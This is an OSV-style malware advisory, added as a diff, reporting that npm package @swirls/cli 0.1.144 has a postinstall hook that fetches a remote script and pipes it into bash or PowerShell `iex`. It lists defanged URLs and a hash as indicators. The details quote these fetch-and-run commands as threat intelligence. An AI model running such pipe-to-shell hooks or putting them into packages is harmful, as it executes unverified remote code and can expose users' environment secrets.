@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13661",
+  "modified": "2026-11-05T00:07:50Z",
+  "published": "2026-11-04T23:00:56Z",
+  "summary": "Malicious code in @swirls/cli (npm)",
+  "details": "@swirls/cli ships a postinstall hook (`node scripts/install.js`) that downloads a shell script from swirls[.]ai and pipes it directly into a shell, with no integrity or signature check on the downloaded content. On Linux/macOS it runs `curl -fsSL hxxps://swirls[.]ai/install | bash` via execSync; on Windows it runs `powershell.exe -NoProfile -Command \"irm hxxps://swirls[.]ai/install[.]ps1 | iex\"` with the installer's full environment (`{...process.env}`) passed through to the spawned process. The hook executes on any non-CI global install (only skipping when `CI` is set or the install is not global), then copies the binary the remote script dropped at `~/.local/bin/swirls` over the package's `bin/swirls` entry and marks it 0755, so subsequent `swirls` invocations run code that was fetched from a remote host at install time rather than anything shipped in the tarball. `bin/swirls` itself is a placeholder that prints the same `curl -fsSL hxxps://swirls[.]ai/install | bash` command, so any environment where lifecycle scripts were skipped still ends up running the remote installer. IOCs: hxxps://swirls[.]ai/install, hxxps://swirls[.]ai/install[.]ps1.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@swirls/cli",
+        "purl": "pkg:npm/%40swirls/cli"
+      },
+      "versions": [
+        "0.1.144"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/@swirls/cli/v/0.1.144"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-13661"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-04T23:00:56Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "swirls[.]ai"
+        ],
+        "sha256": [
+          "fa807cffa84d8ccacd0180e98ec14eef8d2d31c2ad2df8d6c2f3899fb384e777"
+        ],
+        "url_observed": [
+          "hxxps://swirls[.]ai/install",
+          "hxxps://swirls[.]ai/install[.]ps1"
+        ]
+      }
+    }
+  }
+}
